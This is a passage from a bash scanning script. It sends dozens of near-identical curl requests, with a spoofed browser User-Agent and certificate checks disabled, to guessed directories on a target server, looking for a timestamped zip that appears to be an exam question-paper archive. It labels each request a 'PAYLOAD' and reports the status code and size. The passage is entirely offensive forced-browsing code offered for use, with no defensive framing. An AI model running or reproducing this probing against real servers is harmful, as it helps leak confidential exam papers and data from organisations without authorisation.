" "${target}QPDatabaseSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPDatabaseSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaper-FileProcessor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaper-FileProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaper-FileProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Manager_QPUploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Manager_QPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Manager_QPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataOps-QPMgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataOps-QPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataOps-QPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMonitorDataPipeline/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMonitorDataPipeline/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMonitorDataPipeline/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ServiceQPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ServiceQPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ServiceQPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPDatabase-Handling/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPDatabase-Handling/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPDatabase-Handling/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUpload-Suite/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUpload-Suite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUpload-Suite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Platform-QPProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Platform-QPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Platform-QPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Transfer_QPManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Transfer_QPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Transfer_QPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBData-Module/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBData-Module/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBData-Module/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPDatabase-Management/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPDatabase-Management/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPDatabase-Management/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Sync_QstnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Sync_QstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Sync_QstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QP-Platform/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QP-Platform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QP-Platform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MonitoringTool-QPB/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MonitoringTool-QPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MonitoringTool-QPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ExamPaper-Transfer/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ExamPaper-Transfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ExamPaper-Transfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPHandlerDatabaseManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPHandlerDatabaseManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPHandlerDatabaseManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPFile-UploadService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPFile-UploadService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPFile-UploadService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [UploaderExamPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}UploaderExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}UploaderExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchUpload-QPaperDoc/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchUpload-QPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchUpload-QPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutomationQPUploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutomationQPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutomationQPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploaderProcessingSuite/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploaderProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploaderProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Q_P_ProcessingSuite/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Q_P_ProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Q_P_ProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Platform_QsnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Platform_QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Platform_QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataSync_TestPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataSync_TestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataSync_TestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPServiceUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPServiceUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPServiceUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPCloud-BulkUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPCloud-BulkUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPCloud-BulkUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [SystemQPBatch/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}SystemQPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}SystemQPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [HandlingModuleQPAuto/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}HandlingModuleQPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}HandlingModuleQPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPDatabaseDataPipeline/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPDatabaseDataPipeline/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPDatabaseDataPipeline/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPProcessing-CloudSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPProcessing-CloudSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPProcessing-CloudSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Control_QPBatch/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Control_QPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Control_QPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMasterDataUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMasterDataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMasterDataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAdmin-CloudSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAdmin-CloudSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAdmin-CloudSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Platform_QPUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Platform_QPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Platform_QPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBFileDatabaseManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBFileDatabaseManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBFileDatabaseManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPProcessing_CloudSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPProcessing_CloudSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPProcessing_CloudSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAutoBatchProcessor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAutoBatchProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAutoBatchProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPFile_Transfer/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPFile_Transfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPFile_Transfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
